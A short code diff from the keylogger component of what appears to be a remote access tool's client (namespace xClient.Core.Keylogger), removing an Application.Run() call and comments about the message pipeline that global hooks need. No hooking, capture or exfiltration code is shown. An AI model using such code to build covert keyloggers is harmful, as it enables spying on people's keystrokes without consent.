@@ -47,11 +47,6 @@ namespace xClient.Core.Keylogger
 
             _timerFlush.Enabled = true;
             _timerFlush.Start();
-
-            // Initialize the application message pipeline.
-            // Necessary for setting global hooks because setting a global
-            // hook requires an established message pipeline for the thread.
-            Application.Run();
         }
 
         ~Logger()
